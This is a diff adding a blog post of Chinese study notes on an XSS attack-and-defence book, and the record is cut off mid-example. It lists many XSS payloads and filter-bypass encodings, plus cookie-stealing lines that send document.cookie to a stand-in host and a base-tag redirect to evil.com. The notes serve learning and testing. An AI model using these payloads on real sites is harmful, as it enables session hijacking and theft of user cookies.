@@ -1,0 +1,365 @@
+
+<!DOCTYPE html>
+<html lang="default" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>XSS SUMMARY - TyeYeah&#39;s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="TyeYeah, CS,"> 
+    <meta name="description" content="blog on Hexo,《XSS跨站脚本攻击剖析与防御》是一本专门剖析XSS安全的专业书，总共8章，主要包括的内容如下。
+
+第1章 XSS初探，主要阐述了XSS的基础知识，包括XSS的攻击原理和危害。
+第2章 XSS利用方,"> 
+    <meta name="author" content="TyeYeah"> 
+    <link rel="alternative" href="atom.xml" title="TyeYeah&#39;s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    <link rel="stylesheet" href="/css/diaspora.css">
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">TyeYeah&#39;s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="Play/Stop" class="iconfont icon-play"></div>
+    <h3 class="subtitle">XSS SUMMARY</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="QR Code" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">XSS SUMMARY</h1>
+        <div class="stuff">
+            <span>August 21, 2018</span>
+            
+  <ul class="post-tags-list"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/note/">note</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/web/">web</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/xss/">xss</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>《XSS跨站脚本攻击剖析与防御》是一本专门剖析XSS安全的专业书，总共8章，主要包括的内容如下。</p>
+<ul>
+<li>第1章 XSS初探，主要阐述了XSS的基础知识，包括XSS的攻击原理和危害。</li>
+<li>第2章 XSS利用方式，就当前比较流行的XSS利用方式做了深入的剖析，这些攻击往往基于客户端，从挂马、窃取Cookies、会话劫持到钓鱼欺骗，各种攻击都不容忽视。</li>
+<li>第3章 XSS测试和利用工具，介绍了一些常见的XSS测试工具。</li>
+<li>第4章 发掘XSS漏洞，着重以黑盒和白盒的角度介绍如何发掘XSS漏洞，以便帮助读者树立安全意识。</li>
+<li>第5章 XSS Worm，讲解了Web 2.0的最大威胁——跨站脚本蠕虫，剖析了Web 2.0相关概念和其核心技术，这些知识对于理解和预防XSS Worm十分重要。</li>
+<li>第6章 Flash应用安全，就当前的Flash应用安全做出了深入阐述。</li>
+<li>第7章 深入XSS原理，讨论一些比较深入的XSS理论。第8章 防御XSS攻击，介绍了一些防范XSS攻击的方法，例如，运用XSS Filter进行输入过滤和输出编码，使用Firefox浏览器的Noscript插件抵御XSS攻击，使用HTTP-only的Cookies同样能起到保护敏感数据的作用。</li>
+</ul>
+<p>《XSS跨站脚本攻击剖析与防御》适合网站管理人员、信息/网络安全或相关工作从业者、软件开发工程师，以及任何对Web安全技术感兴趣的读者。</p>
+<hr>
+<p>此书讲的不深，但是够全面。此书最大的意义在于带你xss入门。市面上这是唯一一本专门讲xss的书，也是讲的最深最全的。如果你有js基础，看完书至少能保证会玩。</p>
+<p>这本书适合前端与白帽子阅读。xss是最近几年比较热门的一个话题。国内并没有几本系统的介绍xss攻击的书籍。推荐。 </p>
+<hr>
+<p><img src="https://images-na.ssl-images-amazon.com/images/I/41qc1RgIEyL._SX260_.jpg" alt="book pic"></p>
+<h2 id="XSS初探"><a href="#XSS初探" class="headerlink" title="XSS初探"></a>XSS初探</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>反射型（恶意参数放到url中诱导用户点击）和持久型（存储型，即页面内存有js恶意代码）</p>
+<h3 id="测试XSS的代码"><a href="#测试XSS的代码" class="headerlink" title="测试XSS的代码"></a>测试XSS的代码</h3><p>可查看XSS Cheat Sheet，如何构建健壮的XSS代码（相当于反过滤）如下：</p>
+<ul>
+<li>无过滤直接&lt;script&gt;,因为总会过滤&lt;&gt;所以基本没啥用</li>
+<li><p>利用html标签的属性值执行XSS<br>例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=&quot;javascript:alert(/xss/)&quot;&gt;&lt;/table&gt;</span><br><span class="line">&lt;img src=&quot;javascript:alert(‘XSS’);&quot;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果过滤javascript等关键字，可以用Tab、空格和回车符插在其中<br>例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;java		script:alert(‘XSS’);&quot;&gt;</span><br><span class="line"></span><br><span class="line">对其语法中其他变量也适用</span><br><span class="line">利用的是javascript语法中除了换行符有和；一样分割语句的作用，空格什么的都无所谓，不影响语义</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>过滤的话，可对标签属性值转码（ASCII或者十进制、十六进制转码）<br>例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascript&amp;#116&amp;#58alert(‘XSS’);&quot;&gt;（ASCII码转码）</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>eval也可使用来执行相应功能，如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">eval(&quot;alert(‘XSS’)&quot;);</span><br><span class="line">&lt;script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>可以用\链接十六进制字符串，用eval函数执行十六进制字符串形式脚本构造如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x27\x29&quot;);</span><br><span class="line">&lt;script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>也可以执行十进制，但需要用到String.fromCharCode()函数来转换成ASCII码值</p>
+</li>
+</ul>
+<p>原型：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:eval(alert(‘XSS’))&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>变形为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><p>除去在属性值上做文章，还可以自己产生事件<br>例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;button&quot; value=&quot;click me&quot; onclick=&quot;alert(‘click me’)&quot;/&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在CSS上做文章，html标签的style属性值，和head中的style都可以利用<br>例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-image:url(javascript:alert(‘XSS’))&quot;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>head标签中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">body&#123;</span><br><span class="line">background-image:url(&quot;javascript:alert(‘XSS’)&quot;);</span><br><span class="line">&#125;</span><br><span class="line">p&#123;</span><br><span class="line">background-image:expression(alert(&quot;XSS&quot;));</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>外部CSS引用的利用<br>Html文件中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;http://...(自己的网站)/xxx.css&quot;&gt;</span><br><span class="line">&lt;style type=’text/css’&gt;</span><br><span class="line">@import url(http://...(自己的网站)/xxx.css);</span><br><span class="line">@import ‘javascript:alert(&quot;XSS&quot;)’;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>扰乱过滤规则，以前学习的是对&lt;script&gt;标签各种变形，这里是利用属性值可能实战意义更大</p>
+</li>
+</ul>
+<p>原型：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:alert(0);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>转换大小写：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;javascript:alert(‘XSS’);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>大小写混用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iMg sRc=&quot;javascript:alert(‘XSS’);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>双引号变单引号：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=’javascript:alert(0);’&gt;</span><br></pre></td></tr></table></figure></p>
+<p>不用引号：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(0);&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>利用expression时构造全角字符来绕过(全角字符处已加粗。全角字符对于英文字符来说只是加了个空格来补两位，这里猜测和上一节tab与空格绕过类似)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;XSS STYLE=&quot;xss:exｐresｓion(alert(’xss’))&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>使用/<em> </em>/注释来迷惑因为其会被浏览器忽略<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=’java/****/script:alert(0);’&gt;</span><br></pre></td></tr></table></figure></p>
+<p>除/**/外，样式标签中\和结束符\0也是被浏览器忽略的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@\i\0mport ‘j\av\000asc\00ript:alert(&quot;XSS&quot;)’;</span><br></pre></td></tr></table></figure></p>
+<p>标记混乱示例(利用浏览器解析html注释存在的问题,这里我还需要进一步去理解)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;comment&gt;&lt;img src=&quot;&lt;/comment&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;style&gt;&lt;img src=&quot;&lt;/style&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>在一整个网页中，多个&lt;script&gt;&lt;/script&gt;部分，每部分都传递部分信息，最后用特殊办法将消息拼接，叫做拆分跨站法<br>我们可以通过eval和replace事件的组合利用，先在其中加入一些冗余符号来进行混淆，再进行替换删除，最终绕过WAF规则，形成我们想要达到的Payload。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&apos;~a~le~rt~~(~~1~~)~&apos;.replace(/~/g, &apos;&apos;))</span><br></pre></td></tr></table></figure></p>
+<p><b>终极测试探针:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;;&quot;&gt;xss`</span><br></pre></td></tr></table></figure></b></p>
+<p>常用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">=&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(vulnerable)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">%3Cscript%3Ealert(&apos;XSS&apos;)%3C/script%3E</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;imgsrc=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;imgsrc=&quot;http://xxx.com/yyy.png&quot; onerror=&quot;alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;divstyle=&quot;height:expression(alert(&apos;XSS&apos;),1)&quot; /&gt;（这个仅限IE 有效）</span><br></pre></td></tr></table></figure></p>
+<h3 id="shellcode构造与调用"><a href="#shellcode构造与调用" class="headerlink" title="shellcode构造与调用"></a>shellcode构造与调用</h3><ul>
+<li>直接在url中带上exploit</li>
+<li>url中script调用远程服务器的js代码</li>
+<li><p>使用windows.location.hash方法，可以执行在ulr地址栏中的命令，例子如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/xxx.php?exp=&quot;&gt;&lt;script&gt;eval(location.hash.substr(1))&lt;/script&gt;#alert(‘XSS)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>XSS Downloader 即用一段代码使用XMLHTTP对象，构造get请求获取其他网页上的xss代码文件并执行</p>
+</li>
+<li>xss代码存在客户端本地域，如cookie、flash cookie（flash不用之后应该也没他的事了）或者html5提供的localStorage和sessionStorage</li>
+</ul>
+<h2 id="XSS利用方式"><a href="#XSS利用方式" class="headerlink" title="XSS利用方式"></a>XSS利用方式</h2><h3 id="Cookie的利用"><a href="#Cookie的利用" class="headerlink" title="Cookie的利用"></a>Cookie的利用</h3><p>用document.cookie来获取cookie，可直接构造请求，讲客户端cookie送到攻击者自己的网站</p>
+<h3 id="进行会话劫持"><a href="#进行会话劫持" class="headerlink" title="进行会话劫持"></a>进行会话劫持</h3><p>大致理解为用存储型xss在管理员进行操作时，劫持其会话（劫持此时管理员的http请求，比如添加删除用户的http请求）</p>
+<h3 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h3><h3 id="xss-history-back"><a href="#xss-history-back" class="headerlink" title="xss history back"></a>xss history back</h3><p>现在学js发现history是存储的，可以直接用响应方法去跳转，那么也应该有响应方法去获取。本书使用的是，css伪类设置中，link.visited属性进行设置，然后根据设置的变化进行匹配，便可以知道先前访问的是哪些网站。</p>
+<h3 id="客户端信息刺探"><a href="#客户端信息刺探" class="headerlink" title="客户端信息刺探"></a>客户端信息刺探</h3><p>Js代码实现端口扫描、截取剪切板</p>
+<h3 id="其他恶意攻击"><a href="#其他恶意攻击" class="headerlink" title="其他恶意攻击"></a>其他恶意攻击</h3><p>网页挂马、ddos、xss worm</p>
+<h2 id="XSS构造技巧"><a href="#XSS构造技巧" class="headerlink" title="XSS构造技巧"></a>XSS构造技巧</h2><h3 id="利用字符编码"><a href="#利用字符编码" class="headerlink" title="利用字符编码"></a>利用字符编码</h3><p>如对用户输入进行处理，反斜杠转义’或者”，则可以利用”%c1\”两个字符组合在一起成了一个unicode字符，所以可以构造如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c1&quot;;alert(/XSS/);//</span><br></pre></td></tr></table></figure></p>
+<p>这样处理后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c1\&quot;;alert(/XSS/);//</span><br></pre></td></tr></table></figure></p>
+<h3 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h3><p>可以应用事件处理函数<br>可以调用存储在远端的恶意xss代码<br>可以借用location.hash存储xss然后执行<br>可以巧用注释符将两个相邻的输入框进行扩展合并，能够绕开对长度的限制</p>
+<h3 id="使用base标签"><a href="#使用base标签" class="headerlink" title="使用base标签"></a>使用base标签</h3><p>&lt;base&gt;标签并不常用，作用是定义页面上所有使用相对路径的标签的hosting地址<br>应用到xss中就是将其更改为恶意远程服务器地址，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;base href=&quot;http://www.evil.com&quot; /&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="window-name的妙用"><a href="#window-name的妙用" class="headerlink" title="window.name的妙用"></a>window.name的妙用</h3><p>不受同源策略限制，可以用来跨域，利用其可以存储xss代码，之后只需要运行eval(name);即可运行</p>
+<h3 id="Xss可以按照payload出现的位置进行分类"><a href="#Xss可以按照payload出现的位置进行分类" class="headerlink" title="Xss可以按照payload出现的位置进行分类"></a>Xss可以按照payload出现的位置进行分类</h3><p>出现在标签外时要考虑如何构造script标签<br>标签内时考虑闭合单双引号然后命令执行<br>标签属性内考虑闭合单双引号再命令执行<br>事件属性内直接构造命令执行<br>特殊标签内属性内则需要考虑具体情况<br>作为地址的时候，情况如下</p>
+<ul>
+<li>Iframe src</li>
+<li>Form action</li>
+<li>Index formaction</li>
+<li>A href</li>
+<li>Meta content</li>
+<li>Object data</li>
+<li>Embed src<br>构造的时候可以使用<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert()</span><br><span class="line">data:text/html;&lt;script&gt;alert()&lt;script&gt;</span><br><span class="line">data:text/html;base64,PHNjcmlwdD5hb……</span><br><span class="line">data:image/svg+xml;base64,PHN2ZyB4bWxucz……</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="不同标签"><a href="#不同标签" class="headerlink" title="不同标签"></a>不同标签</h3><p>Img中： 添加属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onerror= document.body.append( document.creatElement(‘img’) ).setAttribute( ‘src’ , ’http://xss:port/?xxx=’ + document.cookie )</span><br></pre></td></tr></table></figure></p>
+<p>Script中：使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.location.href=’http://xss:port/?xxx=’ + document.cookie</span><br></pre></td></tr></table></figure></p>
+<p>Body中：添加属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onload= document.body.append( document.creatElement(‘img’) ).setAttribute( ‘src’ , ’http://xss:port/?xxx=’ + document.cookie )</span><br></pre></td></tr></table></figure></p>
+<p>补：其他<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onpageshow=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;style onload=alert(1) /&gt;</span><br><span class="line"></span><br><span class="line">//onbounce事件：是在&lt;marquee&gt;标签中的内容滚动到上下或左右边界时触发的事件处理程序，该事件只有在&lt;marquee&gt;标签的behavior属性设为alternate时才有效；</span><br><span class="line">&lt;marquee behavior=&quot;alternate&quot; onbounce=alert(1)&gt;hack the planet&lt;/marquee&gt;</span><br><span class="line">//onfinish事件：当 marquee 完成 loop 属性设置的值时触发。它只能在 loop 属性设置为大于 0 的某个数字时触发；</span><br><span class="line">&lt;marquee loop=&quot;1&quot; onfinish=alert(1)&gt;hack the planet&lt;/marquee&gt;</span><br><span class="line">//onstart事件: 当 marquee 标签内容开始滚动时触发。</span><br><span class="line">&lt;marquee onstart=alert(1)&gt;hack the planet&lt;/marquee&gt;</span><br><span class="line"></span><br><span class="line">//oncanplay: 在用户可以开始播放音视频（audio/video）时触发；</span><br><span class="line">&lt;audio oncanplay=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">//ondurationchange: 在音视频（audio/video）的时长发生变化时触发；</span><br><span class="line">&lt;audio ondurationchange=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">//onended: 在音视频（audio/video）播放结束时触发；</span><br><span class="line">&lt;audio autoplay=true onended=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">//onloadeddata: 在音视频数据帧加载时触发，也即在当前帧的数据加载完成且还没有足够的数据播放音视频（audio/video）的下一帧时触发；</span><br><span class="line">&lt;audio onloadeddata=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">//onloadedmetadata: 在指定音视频（audio/video）的元数据（如分辨率和时长）加载后触发；</span><br><span class="line">&lt;audio onloadedmetadata=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">//onloadstart: 在浏览器开始寻找指定音视频（audio/video）时触发；</span><br><span class="line">&lt;audio onloadstart=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">//onprogress: 浏览器下载指定的音视频（audio/video）时触发；</span><br><span class="line">&lt;audio onprogress=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br><span class="line">//onsuspend: 在浏览器读取音视频（audio/video）数据中止时触发。</span><br><span class="line">&lt;audio onsuspend=alert(1) src=&quot;/media/hack-the-planet.mp3&quot; /&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="发掘XSS漏洞"><a href="#发掘XSS漏洞" class="headerlink" title="发掘XSS漏洞"></a>发掘XSS漏洞</h2><h3 id="源代码审计"><a href="#源代码审计" class="headerlink" title="源代码审计"></a>源代码审计</h3><p>在使用一些全局变量的时候，接受http方法传送过来的参数，如果不加过滤，则会将恶意代码如xss带入（甚至可通过X-Forwarded-For变量）</p>
+<h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM  XSS"></a>DOM  XSS</h3><p>利用js可操控dom结构来写入XSS</p>
+<h3 id="Flash-XSS"><a href="#Flash-XSS" class="headerlink" title="Flash  XSS"></a>Flash  XSS</h3><p>ActionScript + JavaScript</p>
+<h3 id="巧用语言特性"><a href="#巧用语言特性" class="headerlink" title="巧用语言特性"></a>巧用语言特性</h3><ul>
+<li><p>phpinfo（）函数，低版本的php对用户输入的变量不加转义就打印出来了<br>例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/phpinfo.php?a[]=&lt;script&gt;alert(/XSS/);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>$_SERVER[‘PHP_SELF’]，其代表当前php文件相对于网站根目录的位置地址，但如果url为恶意的，那么恶意url会执行</p>
+</li>
+<li>变量覆盖：register_globals=on指允许各种变量被重新注册、extract()用来将变量从数组导入到当前符号表中，如extract($_GET)为用此方法覆盖所有以GET方法获取的变量、foreach()函数  （具体没有理解，还需要进一步学习）</li>
+</ul>
+<h2 id="XSS-WORM"><a href="#XSS-WORM" class="headerlink" title="XSS  WORM"></a>XSS  WORM</h2><h3 id="Ajax介绍"><a href="#Ajax介绍" class="headerlink" title="Ajax介绍"></a>Ajax介绍</h3><h3 id="运用DOM技术"><a href="#运用DOM技术" class="headerlink" title="运用DOM技术"></a>运用DOM技术</h3><p>遍历DOM 以及document.getElementByname 和document.getElementByTagName和document.getElementById<br>innerHTML方法可以向HTML DOM中插入新内容：this.innerHTML=’<br>’<br>运用DOM获取元素特性的值的方法有getAttribute和setAttribute<br>修改DOM使用createElement(),联合使用appendChild()或insertBefore()</p>
+<h2 id="深入XSS原理"><a href="#深入XSS原理" class="headerlink" title="深入XSS原理"></a>深入XSS原理</h2><h3 id="深入浅出CSRF（跨站请求伪造）"><a href="#深入浅出CSRF（跨站请求伪造）" class="headerlink" title="深入浅出CSRF（跨站请求伪造）"></a>深入浅出CSRF（跨站请求伪造）</h3><p>盗用用户身份，发起恶意请求，形成原因即为采用了隐式身份验证（cookie）</p>
+<p>防御：验证来源referer、使用验证码和加token等</p>
+<h3 id="Hacking-JSON"><a href="#Hacking-JSON" class="headerlink" title="Hacking JSON"></a>Hacking JSON</h3><p>JSON为JS子集，格式为名值对<br>JSON做对象的话用{}包裹键值对们，如果是做数组的话，用[]<br>JSON注入不甚了解，看书得出的结论为，JS在解析JSON时，如果JSON为恶意制作的，那么极有可能转化为javascript对象从而在浏览器中执行，对系统造成损害。<br>JSON Hijacking就是CSRF的另一种形式，书中也是这么讲。此即为通过恶意手段，获取用户访问正常页面时返回的JSON信息</p>
+<h3 id="HTTP-Response-Splitting"><a href="#HTTP-Response-Splitting" class="headerlink" title="HTTP Response Splitting"></a>HTTP Response Splitting</h3><p>也称CRLF注射攻击，注射大致意味着， 在一个地方的输入框内，多输入代表其他部分信息的内容，同事不会被系统拦截或者拒绝，这就成功了。<br>CRLF == \r\n == 0x0D 0x0A == 13 10(ASCII码值) == 回车 换行 为http header中各项分隔的标志<br>利用的话 可以直接在url里加入%0D%0A%0D%0A后接js代码，这里的两个CRLF我猜想应该是分开http header 和body部分用的。</p>
+<h3 id="MHTML协议安全"><a href="#MHTML协议安全" class="headerlink" title="MHTML协议安全"></a>MHTML协议安全</h3><p>MHTML是MIME HTML (Multipurpose Internet Mail Extension HTML，聚合超文本标记语言)的缩写，是由RFC 2557定义的把一个多媒体的页面所有内容都保存到同一个文档解决方案。这个方案是由微软提出从IE5.0开始支持，另外Opera9.0也开始支持，Safari可以把文件保存为.mht（MHTML文件的后缀）格式，但不支持显示它。</p>
+<p>实际mhtml文件（.mht文件）内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">From: =?gb2312?B?0tHTySBXaW5kb3dzIEludGVybmV0IEV4cGxvcmVyIDEwILGjtOY=?=</span><br><span class="line">Subject: =?gb2312?B?bWh0bWyw/Ljxyr1fsNm2yMvRy/c=?=</span><br><span class="line">Date: Thu, 31 May 2018 10:51:30 +0800</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: multipart/related;</span><br><span class="line">	type=&quot;text/html&quot;;</span><br><span class="line">	